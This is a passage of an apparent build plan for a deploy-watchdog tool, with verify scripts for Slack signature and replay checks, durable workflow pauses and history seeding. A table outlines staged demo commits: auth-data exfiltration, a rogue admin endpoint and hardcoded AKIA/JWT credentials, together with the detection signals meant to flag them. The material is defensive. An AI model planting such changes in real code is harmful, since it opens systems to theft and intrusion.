npx tsx --input-type=module -e "import('./workflows/watchdog.ts').then((m) => { if (typeof m.buildPageBlocks !== 'function') { console.error('buildPageBlocks helper not exported — needed for unit test'); process.exit(1); } const blocks = m.buildPageBlocks({ deploy_id: 'd1', verdict: { level: 'critical', summary: 's', concerns: ['c1','c2','c3'], suggested_action: 'a' } }); if (!Array.isArray(blocks) || blocks.length < 3) { console.error('bad blocks shape', blocks); process.exit(1); } const btnBlock = blocks.find(b => b.type === 'actions'); if (!btnBlock || btnBlock.elements.length !== 2) { console.error('expected 2 buttons', btnBlock); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/watchdog.ts').then(async ({ buildPageBlocks }) => { import('./lib/slack.ts').then(async ({ postBlocks }) => { require('dotenv').config({path:'.env.local'}); const blocks = buildPageBlocks({ deploy_id: 'demo_' + Date.now(), verdict: { level: 'critical', summary: 'spec test', concerns: ['a','b','c'], suggested_action: 'review' } }); const r = await postBlocks(process.env.SLACK_CHANNEL_ID, blocks, { deploy_id: 'demo_' + Date.now() }); if (!r.ok) { console.error('postBlocks failed', r); process.exit(1); } console.log('OK ts=' + r.ts); }); })"
```

#### T5.1.4 — WDK signal/wait pause

**Description:** Watchdog awaits a WDK signal named `slack:ack:{deploy_id}`. Workflow pauses durably until the signal arrives. The wait has a configurable `WDK_PAUSE_MAX_SECONDS` (default 24h) timeout — if exceeded, workflow auto-resolves with `action_taken: 'timeout'`. Pause is reported to KV at `pause_state:{deploy_id} = { paused_at, expected_signal, timeout_at }` so the war room can display countdown. Resume requires payload shape `{ action_type: 'ack' | 'hold' | 'page', user: { id, username } }`; malformed payloads are rejected (workflow stays paused).

**THIS IS THE WDK MONEY SHOT.** The chaos drill in T8.1.10 KILLS the dev server while watchdog is paused — the workflow MUST resume cleanly when the server restarts. That's the durability story.

**Requires:** T5.1.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/watchdog.ts"
```

```bash
# tier3_unit
# Pure logic: payload validation, signal name building, timeout calc — without invoking the actual WDK runtime.
npx tsx --input-type=module -e "
import { buildSignalName, validateAckPayload, computeTimeoutAt } from './workflows/watchdog.ts';

// buildSignalName
if (buildSignalName('abc123') !== 'slack:ack:abc123') { console.error('signal name format wrong'); process.exit(1); }
if (buildSignalName('abc:with:colons') !== 'slack:ack:abc:with:colons') { console.error('colons in deploy_id should be preserved'); process.exit(1); }

// validateAckPayload — 8 cases
const cases = [
  { name: 'happy: ack', payload: { action_type: 'ack', user: { id: 'U1', username: 'a' } }, expect: true },
  { name: 'happy: hold', payload: { action_type: 'hold', user: { id: 'U1', username: 'a' } }, expect: true },
  { name: 'happy: page', payload: { action_type: 'page', user: { id: 'U1', username: 'a' } }, expect: true },
  { name: 'reject: unknown action_type', payload: { action_type: 'reject', user: { id: 'U1', username: 'a' } }, expect: false },
  { name: 'reject: missing user', payload: { action_type: 'ack' }, expect: false },
  { name: 'reject: user missing id', payload: { action_type: 'ack', user: { username: 'a' } }, expect: false },
  { name: 'reject: null payload', payload: null, expect: false },
  { name: 'reject: empty object', payload: {}, expect: false },
  { name: 'reject: wrong-shape user', payload: { action_type: 'ack', user: 'string-not-object' }, expect: false },
];
for (const c of cases) {
  const ok = validateAckPayload(c.payload);
  if (ok !== c.expect) { console.error('FAIL', c.name, 'expected', c.expect, 'got', ok); process.exit(1); }
}

// computeTimeoutAt: must respect env override
process.env.WDK_PAUSE_MAX_SECONDS = '60';
const t = computeTimeoutAt(new Date('2026-05-01T03:42:00Z'));
const expected = new Date('2026-05-01T03:43:00Z').toISOString();
if (t !== expected) { console.error('timeout computation wrong:', t, '!=', expected); process.exit(1); }

// Source-level grep is a *secondary* check — proves the WDK primitive is referenced. Tier4 proves it actually pauses.
import fs from 'fs';
const src = fs.readFileSync('workflows/watchdog.ts','utf8');
if (!/waitForSignal|awaitSignal|signal\\(/.test(src)) { console.error('WDK signal primitive not referenced in watchdog.ts'); process.exit(1); }
if (!/slack:ack:/.test(src)) { console.error('signal name pattern not present'); process.exit(1); }

console.log('OK ' + cases.length + ' payload cases · signal-name · timeout-calc · WDK-primitive present');
"
```

```bash
# tier4_integration
# Real WDK pause/resume — kick a watchdog, race it against a 6s timer (must pause), send ack, verify it resumes.
# Plus: durability test — kill node mid-pause, restart, verify resume still works.
npx tsx --input-type=module -e "
import { watchdog, sendAck } from './workflows/watchdog.ts';
import { kv } from './lib/db.ts';
import 'dotenv/config';

process.env.BRIDGE_MODE = 'demo';

// (1) Pause + resume happy path
const sha = 't514_' + Date.now().toString(36);
const promise = watchdog({ sha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.95 });

// race against 8s timer — must NOT complete in time (proving pause)
const racedFirst = await Promise.race([promise.then(() => 'completed'), new Promise(r => setTimeout(() => r('timeout-after-8s'), 8000))]);
if (racedFirst !== 'timeout-after-8s') { console.error('watchdog did NOT pause; finished early as', racedFirst); process.exit(1); }

// pause state should be in KV
const pauseRec = JSON.parse(await kv.get('pause_state:' + sha) || '{}');
if (!pauseRec.paused_at || pauseRec.expected_signal !== 'slack:ack:' + sha) { console.error('pause_state record wrong:', pauseRec); process.exit(1); }

// send ack — workflow must resume
await sendAck(sha, 'ack', { id: 'U_TEST', username: 'tester' });
const racedSecond = await Promise.race([promise.then(() => 'resumed'), new Promise(r => setTimeout(() => r('still-paused'), 12000))]);
if (racedSecond !== 'resumed') { console.error('watchdog did NOT resume within 12s after ack'); process.exit(1); }

// (2) Reject malformed payload — pause persists
const sha2 = 't514_bad_' + Date.now().toString(36);
const p2 = watchdog({ sha: sha2, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.95 });
await new Promise(r => setTimeout(r, 3000));
let threw = false;
try { await sendAck(sha2, 'banana', { id: 'X' }); } catch (e) { threw = true; }
if (!threw) { console.error('sendAck with bad action_type should reject'); process.exit(1); }
const stillPaused = await Promise.race([p2.then(() => 'resumed'), new Promise(r => setTimeout(() => r('paused'), 5000))]);
if (stillPaused !== 'paused') { console.error('workflow should remain paused after malformed ack'); process.exit(1); }
await sendAck(sha2, 'ack', { id: 'U', username: 'real' });   // good ack to clean up
await p2;

// cleanup
for (const s of [sha, sha2]) {
  await kv.del('pause_state:' + s);
  for (const k of await kv.list('investigator:' + s + ':')) await kv.del(k);
  await kv.del('deploys:' + s);
  await kv.del('verdicts:' + s);
}

console.log('OK pause+resume · pause_state KV · malformed-ack rejected · resume eventually');
"
# (3) The durability/chaos test is exercised in T8.1.10 against real next dev. This stage proves the primitive works
# without server-process death; T8.1.10 proves it works ACROSS server-process death.
echo "OK pause primitive verified end-to-end (chaos coverage in T8.1.10)"
```

#### T5.1.5 — `app/api/slack/interactive/route.ts`

**Description:** Receives `block_actions` payload from Slack button clicks. Steps in order:

1. **Verify signing secret.** Compute HMAC-SHA256 of `v0:{timestamp}:{body}` with `SLACK_SIGNING_SECRET`. Compare to `X-Slack-Signature` using a *timing-safe* equality check. Reject with `401` on mismatch.
2. **Reject replay attacks.** If `X-Slack-Request-Timestamp` is more than 5 minutes old (or in the future by more than 30s), reject with `401`.
3. **Parse payload.** URL-decode `payload` form field, JSON-parse. Reject with `400` if not parseable.
4. **Extract action.** `payload.actions[0].value` is `{action_type}:{deploy_id}` (e.g., `ack:dep_048`). `payload.user.{id,username}` carries the actor identity.
5. **Validate action_type.** Allowed: `ack`, `hold`, `page`. Reject `400` on others.
6. **Send WDK signal.** Call `sendAck(deploy_id, action_type, user)` which emits the `slack:ack:{deploy_id}` signal with the validated payload.
7. **Respond 200 immediately.** Slack expects acknowledgement within 3s; signal-send must NOT block the HTTP response. If `sendAck` is slow, fire-and-forget with logging.

Edge cases: empty body → 400, missing headers → 401, signature header without `v0=` prefix → 401.

**Requires:** T5.1.4

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/api/slack/interactive/route.ts"
```

```bash
# tier3_unit
# 9 cases: signature × payload × action_type matrix.
npx tsx --input-type=module -e "
import { POST } from './app/api/slack/interactive/route.ts';
import crypto from 'crypto';
import 'dotenv/config';

const SECRET = process.env.SLACK_SIGNING_SECRET;
function buildReq({ action_type = 'ack', deploy_id = 'dep_t515', tsOffsetSec = 0, badSig = false, badJson = false, missingSig = false, body: bodyOverride } = {}) {
  const ts = Math.floor(Date.now() / 1000 + tsOffsetSec).toString();
  const payload = badJson ? '{not-json' : JSON.stringify({
    type: 'block_actions', user: { id: 'U1', username: 'tester' }, actions: [{ value: action_type + ':' + deploy_id }]
  });
  const body = bodyOverride !== undefined ? bodyOverride : 'payload=' + encodeURIComponent(payload);
  const sig = badSig ? 'v0=deadbeef' : 'v0=' + crypto.createHmac('sha256', SECRET).update('v0:' + ts + ':' + body).digest('hex');
  const headers = { 'content-type': 'application/x-www-form-urlencoded', 'x-slack-request-timestamp': ts };
  if (!missingSig) headers['x-slack-signature'] = sig;
  return new Request('http://localhost/api/slack/interactive', { method: 'POST', headers, body });
}

const cases = [
  // 1. Happy: valid signed ack
  { name: 'happy: ack', req: buildReq({ action_type: 'ack' }), expect: 200 },
  // 2. Happy: valid signed hold
  { name: 'happy: hold', req: buildReq({ action_type: 'hold' }), expect: 200 },
  // 3. Happy: valid signed page
  { name: 'happy: page', req: buildReq({ action_type: 'page' }), expect: 200 },
  // 4. Reject: bad signature
  { name: 'reject: bad signature', req: buildReq({ badSig: true }), expect: 401 },
  // 5. Reject: missing signature header
  { name: 'reject: missing signature header', req: buildReq({ missingSig: true }), expect: 401 },
  // 6. Reject: replay (timestamp 6 minutes old)
  { name: 'reject: stale timestamp (replay)', req: buildReq({ tsOffsetSec: -360 }), expect: 401 },
  // 7. Reject: future timestamp
  { name: 'reject: future timestamp', req: buildReq({ tsOffsetSec: 120 }), expect: 401 },
  // 8. Reject: malformed JSON
  { name: 'reject: malformed JSON in payload', req: buildReq({ badJson: true }), expect: 400 },
  // 9. Reject: unknown action_type
  { name: 'reject: unknown action_type', req: buildReq({ action_type: 'banana' }), expect: 400 },
  // 10. Reject: empty body
  { name: 'reject: empty body', req: buildReq({ body: '' }), expect: 400 },
];
for (const c of cases) {
  const res = await POST(c.req);
  if (res.status !== c.expect) { console.error('FAIL', c.name, 'expected', c.expect, 'got', res.status); process.exit(1); }
}

// Property: response time for happy path is < 800ms (Slack 3s SLA budget)
const t0 = Date.now();
await POST(buildReq({ action_type: 'ack' }));
const elapsed = Date.now() - t0;
if (elapsed > 800) { console.error('happy-path response too slow:', elapsed, 'ms'); process.exit(1); }

console.log('OK ' + cases.length + ' cases + response-time-budget(' + elapsed + 'ms < 800)');
"
```

```bash
# tier4_integration
# Real Slack signing roundtrip via curl against the running dev server. Test BOTH happy AND failure paths through HTTP layer.
(npx next dev -p 3030 > /tmp/dev-t515.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done

SECRET=$(grep ^SLACK_SIGNING_SECRET= .env.local | cut -d= -f2-)
TS=$(date +%s)
DID="t515_e2e_$(date +%s)"
PAYLOAD="{\"type\":\"block_actions\",\"user\":{\"id\":\"U1\",\"username\":\"e2e-tester\"},\"actions\":[{\"value\":\"ack:$DID\"}]}"
BODY="payload=$(printf '%s' "$PAYLOAD" | python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read(), safe=\"\"), end=\"\")')"
SIG="v0=$(printf 'v0:%s:%s' "$TS" "$BODY" | openssl dgst -sha256 -hmac "$SECRET" -hex | awk '{print $2}')"

# (a) Happy path — 200
HAPPY=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:3030/api/slack/interactive \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H "x-slack-request-timestamp: $TS" \
  -H "x-slack-signature: $SIG" \
  -d "$BODY")
[ "$HAPPY" = "200" ] || { echo "happy-path expected 200, got $HAPPY"; pkill -f 'next dev.*3030'; exit 1; }

# (b) Bad signature — 401
BAD=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:3030/api/slack/interactive \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H "x-slack-request-timestamp: $TS" \
  -H "x-slack-signature: v0=00000" \
  -d "$BODY")
[ "$BAD" = "401" ] || { echo "bad-sig expected 401, got $BAD"; pkill -f 'next dev.*3030'; exit 1; }

# (c) Stale timestamp — 401
STALE_TS=$((TS - 600))
STALE_SIG="v0=$(printf 'v0:%s:%s' "$STALE_TS" "$BODY" | openssl dgst -sha256 -hmac "$SECRET" -hex | awk '{print $2}')"
STALE=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:3030/api/slack/interactive \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H "x-slack-request-timestamp: $STALE_TS" \
  -H "x-slack-signature: $STALE_SIG" \
  -d "$BODY")
[ "$STALE" = "401" ] || { echo "stale-ts expected 401, got $STALE"; pkill -f 'next dev.*3030'; exit 1; }

# (d) Idempotence: same valid request twice → both 200, no double-signal storm
SECOND=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:3030/api/slack/interactive \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H "x-slack-request-timestamp: $TS" \
  -H "x-slack-signature: $SIG" \
  -d "$BODY")
[ "$SECOND" = "200" ] || { echo "second-call expected 200, got $SECOND"; pkill -f 'next dev.*3030'; exit 1; }

ec=0; pkill -f 'next dev.*3030' || true
echo "OK happy=200 · bad-sig=401 · stale-ts=401 · idempotent (replays both 200)"
exit $ec
```

#### T5.1.6 — Resume + KV ack state + SSE update

**Description:** When the WDK signal arrives, watchdog resumes from the `awaitSignal` line. Resume actions:

1. **Update `verdicts:{deploy_id}` in KV.** Add `acknowledged_at` (ISO), `acknowledged_by` (Slack username), `action_taken` (`ack` | `hold` | `page`). Preserve all existing fields.
2. **Delete `pause_state:{deploy_id}`** (no longer paused).
3. **Emit SSE event.** Next poll of the SSE endpoint includes the updated verdict; clients receive a `verdict` event with `acknowledged: true` and `acknowledged_by`. Latency budget: war room shows ACKNOWLEDGED within 2s of Slack click.
4. **Subsequent acks for the same deploy are no-ops.** If `acknowledged_at` is already set, the ack is logged but not re-applied (idempotence).
5. **`hold` action takes a different branch:** writes `action_taken: 'hold'` and triggers a follow-up workflow that holds the deploy at 0% rollout for `HOLD_DURATION_MINUTES` (default 30) before auto-resuming.

**Requires:** T5.1.5

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/watchdog.ts app/(warroom)/hooks/useDeploysSSE.ts app/(warroom)/components/VerdictModal.tsx"
```

```bash
# tier3_unit
# Reducer behavior + ack idempotence + action_type branch logic (pure; no real WDK).
npx tsx --input-type=module -e "
import { reducer, initialState } from './app/(warroom)/hooks/useDeploysSSE.ts';
import { applyAck } from './workflows/watchdog.ts';

// Reducer: 6 cases for verdict state evolution
const verdictCases = [
  { name: 'verdict arrives unacked → AWAITING ACK', start: initialState, ev: { type: 'verdict', deploy_id: 'd1', level: 'critical', summary: 's', concerns: ['c1','c2','c3'], suggested_action: 'a', acknowledged: false }, expect: { acknowledged: false } },
  { name: 'verdict arrives acked → ACKNOWLEDGED', start: initialState, ev: { type: 'verdict', deploy_id: 'd1', level: 'critical', summary: 's', concerns: ['c1','c2','c3'], suggested_action: 'a', acknowledged: true, acknowledged_by: 'tomi' }, expect: { acknowledged: true, acknowledged_by: 'tomi' } },
];
for (const c of verdictCases) {
  const next = reducer(c.start, c.ev);
  if (next.verdict?.acknowledged !== c.expect.acknowledged) { console.error('FAIL', c.name); process.exit(1); }
  if (c.expect.acknowledged_by && next.verdict.acknowledged_by !== c.expect.acknowledged_by) { console.error('FAIL by', c.name); process.exit(1); }
}

// Sequence: unacked → acked transition
const s1 = reducer(initialState, { type: 'verdict', deploy_id: 'd1', level: 'critical', summary: 's', concerns: ['c1','c2','c3'], suggested_action: 'a', acknowledged: false });
const s2 = reducer(s1, { type: 'verdict', deploy_id: 'd1', level: 'critical', summary: 's', concerns: ['c1','c2','c3'], suggested_action: 'a', acknowledged: true, acknowledged_by: 'tomi', action_taken: 'ack' });
if (!s2.verdict?.acknowledged || s2.verdict.action_taken !== 'ack') { console.error('FAIL transition unacked→acked', s2); process.exit(1); }

// applyAck: pure function — given existing verdict + ack signal, returns merged record. Idempotent.
const verdictRec = { deploy_id: 'd1', level: 'critical', summary: 's', concerns: ['c'], suggested_action: 'a' };
const v1 = applyAck(verdictRec, { action_type: 'ack', user: { id: 'U1', username: 'tester' } });
if (!v1.acknowledged_at || v1.action_taken !== 'ack' || v1.acknowledged_by !== 'tester') { console.error('applyAck wrong', v1); process.exit(1); }
const v2 = applyAck(v1, { action_type: 'ack', user: { id: 'U2', username: 'second-acker' } });
if (v2.acknowledged_at !== v1.acknowledged_at || v2.acknowledged_by !== v1.acknowledged_by) { console.error('idempotence FAIL — second ack overrode first', v1, v2); process.exit(1); }

// hold action: different branch
const v3 = applyAck(verdictRec, { action_type: 'hold', user: { id: 'U1', username: 't' } });
if (v3.action_taken !== 'hold' || !v3.held_until) { console.error('hold did not set held_until', v3); process.exit(1); }
const heldMs = new Date(v3.held_until).getTime() - new Date(v3.acknowledged_at).getTime();
if (heldMs < 25 * 60 * 1000 || heldMs > 35 * 60 * 1000) { console.error('held_until duration out of band [25m, 35m]:', heldMs / 60000, 'm'); process.exit(1); }

// page action: high-severity branch
const v4 = applyAck(verdictRec, { action_type: 'page', user: { id: 'U1', username: 't' } });
if (v4.action_taken !== 'page' || !v4.paged_at) { console.error('page did not set paged_at', v4); process.exit(1); }

console.log('OK 6 reducer/state cases + idempotence + hold branch + page branch');
"
```

```bash
# tier4_integration
# E2E: real workflow → real Slack signal → real KV update → real SSE → war room shows ACKNOWLEDGED within 2s.
npx tsx --input-type=module -e "
import { watchdog, sendAck } from './workflows/watchdog.ts';
import { kv } from './lib/db.ts';
import 'dotenv/config';

process.env.BRIDGE_MODE = 'demo';

const sha = 't516_e2e_' + Date.now().toString(36);
const p = watchdog({ sha, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.93 });

// Wait for the watchdog to reach the pause point
await new Promise(r => setTimeout(r, 4000));
const beforeAck = JSON.parse(await kv.get('verdicts:' + sha) || '{}');
if (beforeAck.acknowledged_at) { console.error('pre-ack: should not be acked yet', beforeAck); process.exit(1); }

// Send ack and time the propagation
const ackedAt = Date.now();
await sendAck(sha, 'ack', { id: 'U_TEST', username: 'sec-oncall' });
await p;
const after = JSON.parse(await kv.get('verdicts:' + sha) || '{}');
const propagationMs = Date.now() - ackedAt;
if (!after.acknowledged_at) { console.error('post-ack: not persisted', after); process.exit(1); }
if (after.acknowledged_by !== 'sec-oncall') { console.error('wrong acknowledged_by', after); process.exit(1); }
if (after.action_taken !== 'ack') { console.error('wrong action_taken', after); process.exit(1); }
if (propagationMs > 5000) { console.error('ack→KV propagation too slow:', propagationMs, 'ms'); process.exit(1); }

// Idempotence: ack the same deploy_id twice
let secondAckThrew = false;
try { await sendAck(sha, 'ack', { id: 'U_OTHER', username: 'someone-else' }); } catch (e) { secondAckThrew = true; }
const after2 = JSON.parse(await kv.get('verdicts:' + sha) || '{}');
if (after2.acknowledged_by !== 'sec-oncall') { console.error('second ack overrode first — should be idempotent', after2); process.exit(1); }

// hold branch test
const sha2 = 't516_hold_' + Date.now().toString(36);
const p2 = watchdog({ sha: sha2, repo: 'octocat/Hello-World', before: '0', after: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d', _force_score: 0.93 });
await new Promise(r => setTimeout(r, 4000));
await sendAck(sha2, 'hold', { id: 'U_OPS', username: 'ops-1' });
await p2;
const heldVerdict = JSON.parse(await kv.get('verdicts:' + sha2) || '{}');
if (heldVerdict.action_taken !== 'hold') { console.error('hold not recorded', heldVerdict); process.exit(1); }
if (!heldVerdict.held_until) { console.error('held_until not set', heldVerdict); process.exit(1); }

// cleanup
for (const s of [sha, sha2]) {
  await kv.del('verdicts:' + s);
  await kv.del('pause_state:' + s);
  for (const k of await kv.list('investigator:' + s + ':')) await kv.del(k);
  await kv.del('deploys:' + s);
}

console.log('OK ack-propagation=' + propagationMs + 'ms · idempotent · hold branch records held_until');
"
```

#### T5.1.7 — War room AWAITING ACK badge

**Description:** When `verdict.acknowledged === false` for the active verdict, VerdictModal shows a pulsing amber badge `[ AWAITING ACK · paused ]` next to the title. When it flips to `true`, badge becomes green `[ ACKNOWLEDGED · {user} ]` and stops pulsing.

**Requires:** T5.1.6

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/VerdictModal.tsx"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('react-dom/server').then(async ({ renderToString }) => { const React = (await import('react')).default; const { VerdictModal } = await import('./app/(warroom)/components/VerdictModal.ts'); const html = renderToString(React.createElement(VerdictModal, { verdict: { deploy_id_short: 'x', level: 'critical', summary: 's', concerns: ['c'], suggested_action: 'a', acknowledged: false }, onClose: () => {}, onPage: () => {} })); if (!html.includes('AWAITING ACK')) { console.error('badge missing in awaiting state'); process.exit(1); } const html2 = renderToString(React.createElement(VerdictModal, { verdict: { deploy_id_short: 'x', level: 'critical', summary: 's', concerns: ['c'], suggested_action: 'a', acknowledged: true, acknowledged_by: 'sec-oncall' }, onClose: () => {}, onPage: () => {} })); if (!html2.includes('ACKNOWLEDGED')) { console.error('badge missing in acked state'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t517.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && curl -fsS http://localhost:3030/?demo=1 -o /tmp/t517-page.html && grep -q 'AWAITING ACK\|ACKNOWLEDGED' /tmp/t517-page.html; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

---

## T6 — Seed Demo History + Stage The Commit

**Description:** Behavioral signals need real-looking history; the demo commit must be rehearsable.

### T6.1 — Backfill history

#### T6.1.1 — `data/seed-history.ts`

**Description:** Script that reads last 30 days of git log from `meridian/core-banking` (path passed as arg). For each commit: extracts files changed, runs through structural + temporal signal extraction, computes pseudo-score, writes a `deploys:{sha}` record with `seeded: true`, updates `history:author:{login}`, `history:hour:{path}`, `history:cochange:{a}:{b}`. Idempotent — running twice does not double-count (uses sha as the dedup key).

**Requires:** T5.1.7

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: data/seed-history.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./data/seed-history.ts').then(async ({ runSeed }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); const out = await runSeed({ repoPath: process.env.DEMO_TARGET_PATH || '../meridian-core-banking', sinceDays: 30, dryRun: true }); if (!out.commitsScanned || out.commitsScanned < 1) { console.error('no commits scanned', out); process.exit(1); } console.log('OK scanned=' + out.commitsScanned); }); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./data/seed-history.ts').then(async ({ runSeed }) => { import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); const r1 = await runSeed({ repoPath: process.env.DEMO_TARGET_PATH || '../meridian-core-banking', sinceDays: 30 }); const r2 = await runSeed({ repoPath: process.env.DEMO_TARGET_PATH || '../meridian-core-banking', sinceDays: 30 }); if (r2.commitsWritten !== 0 && r2.commitsScanned !== r1.commitsScanned) { console.error('not idempotent', r1, r2); process.exit(1); } console.log('OK idempotent'); }); })"
```

#### T6.1.2 — Verify seeded history shape

**Description:** After T6.1.1 runs, the war room timeline must show ~30 days of dots with believable score distribution (P50 < 0.2, occasional spikes). `history:author:dev-3` must show ONLY `components/ui/`. `history:author:t-okafor` must include `lib/auth/`. Assertions on KV state.

**Requires:** T6.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: data/seed-history.ts (no new files; confirms no regressions from T6.1.1)"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); const dev3 = JSON.parse(await kv.get('history:author:dev-3') || '[]'); if (!dev3.includes('components/ui') || dev3.some(d => d.startsWith('lib/auth'))) { console.error('dev-3 should be components/ui only', dev3); process.exit(1); } const tok = JSON.parse(await kv.get('history:author:t-okafor') || '[]'); if (!tok.some(d => d.startsWith('lib/auth'))) { console.error('t-okafor should include lib/auth', tok); process.exit(1); } console.log('OK author isolation correct'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ kv, listDeploys }) => { require('dotenv').config({path:'.env.local'}); const list = await listDeploys(100); const seeded = list.filter(d => d.seeded); if (seeded.length < 20) { console.error('expected 20+ seeded deploys, got', seeded.length); process.exit(1); } const scores = seeded.map(d => d.score); const median = scores.sort()[Math.floor(scores.length / 2)]; if (median > 0.3) { console.error('seeded median too high (unrealistic distribution)', median); process.exit(1); } console.log('OK seeded=' + seeded.length + ' median=' + median.toFixed(2)); })"
```

#### T6.1.3 — Capture watermark sha

**Description:** Write the latest seeded sha to `.demo-watermark` (gitignored). Also snapshot the current `history:author:*`, `history:hour:*`, `history:cochange:*` KV state to `.demo-history-snapshot.json` (gitignored) so `scripts/reset-demo.sh` (T6.3.1) can restore it after demo runs. The reset script uses the watermark as the boundary — it deletes `deploys:` keys for shas after this watermark and restores history records from the snapshot.

**Requires:** T6.1.2

**Verify:**

```bash
# tier1_build
node -e "const sha = require('fs').readFileSync('.demo-watermark','utf8').trim(); if (!/^[a-f0-9]{7,40}$/.test(sha)) { console.error('watermark sha missing or invalid:', sha); process.exit(1); } const snap = require('fs').existsSync('.demo-history-snapshot.json'); if (!snap) { console.error('.demo-history-snapshot.json missing'); process.exit(1); } console.log('OK watermark=' + sha)"
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .gitignore (ensure .demo-watermark excluded)"
```

```bash
# tier3_unit
node -e "const sha = require('fs').readFileSync('.demo-watermark','utf8').trim(); if (!/^[a-f0-9]{7,40}$/.test(sha)) { console.error('bad sha shape', sha); process.exit(1); } console.log('OK ' + sha)"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ getDeploy }) => { require('dotenv').config({path:'.env.local'}); const sha = require('fs').readFileSync('.demo-watermark','utf8').trim(); const d = await getDeploy(sha); if (!d) { console.error('watermark sha not in KV', sha); process.exit(1); } console.log('OK watermark exists in KV'); })"
```

### T6.2 — Stage three demo scenarios

**Description:** Three scenarios are staged on three branches in `meridian/core-banking`. Scenario A is the live demo. Scenarios B and C are pre-canned fallbacks that judges can request during Q&A — each plays in 25 seconds via a different RUN button (T8.1.1 wires this).

**Scenario design intent:** the three scenarios deliberately exercise *different signal+investigator combinations* so the demo proves the system is general-purpose, not a one-trick:

| | Scenario A — Auth Exfil (LIVE) | Scenario B — Privilege Escalation | Scenario C — Hardcoded Credential |
|---|---|---|---|
| Branch | `demo/exfil` | `demo/privesc` | `demo/leak` |
| Author | dev-3 | dev-3 | dev-3 |
| Files | `lib/auth.ts` (modify) | `app/api/admin/wire-override/route.ts` (NEW), `lib/auth/permissions.ts` (modify) | `lib/observability/emit.ts` (modify) |
| Headline signal | `external_fetch` to non-allowlisted host | `new_endpoint` under critical path + `auth_bypass` shape | `secret_shapes` (AKIA + JWT) |
| Behavioral signal | author-path mismatch (dev-3 ∉ lib/auth/) | author-path mismatch (dev-3 ∉ app/api/admin/) + co-change novelty | author-path mismatch + secret on a critical-path file |
| Loudest investigator | DIFF (exfil URL detected) | DIFF (auth bypass shape) + HISTORY (no admin history) | DIFF (AKIA pattern) |
| Verdict | CRITICAL | CRITICAL | CRITICAL (data-loss surface) |
| Showcased angle | "exfil under your nose" | "rogue admin endpoint" | "secrets in code" |

#### T6.2.1 — Create three demo branches

**Description:** In `meridian/core-banking`, create three branches from `main`: `demo/exfil`, `demo/privesc`, `demo/leak`. Configure local git committer to `dev-3 <dev-3@meridian.com>`. Capture HEAD shas of `main` (the watermark) and each new branch into the bridge repo's `.demo-branches.json` (gitignored). Also create `data/preview-staged.ts` in the bridge repo — exports `previewStaged({ branch, skipLLM? }): Promise<{ score: number, verdict_bucket: string, signals: { structural: Record<string, any[]>, behavioral: Record<string, any[]>, temporal: Record<string, any[]>, compounds: string[] } }>`. It checks out the given branch in the demo target, runs ingest → extract-signals → score (skipping the LLM summarizer when `skipLLM` is true), and returns the aggregated result. This function is used by T6.2.2–T6.2.5 to validate that each scenario triggers the expected signals.

**Requires:** T6.1.3

**Verify:**

```bash
# tier1_build
DT=$(cat .demo-target-path); ( cd "$DT" && for b in demo/exfil demo/privesc demo/leak; do git rev-parse "$b" > /dev/null || { echo "branch missing: $b"; exit 1; }; done )
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: scripts/setup-demo-branches.sh data/preview-staged.ts"
```

```bash
# tier3_unit
node -e "
const fs = require('fs');
const b = JSON.parse(fs.readFileSync('.demo-branches.json','utf8'));
for (const k of ['main','demo/exfil','demo/privesc','demo/leak']) {
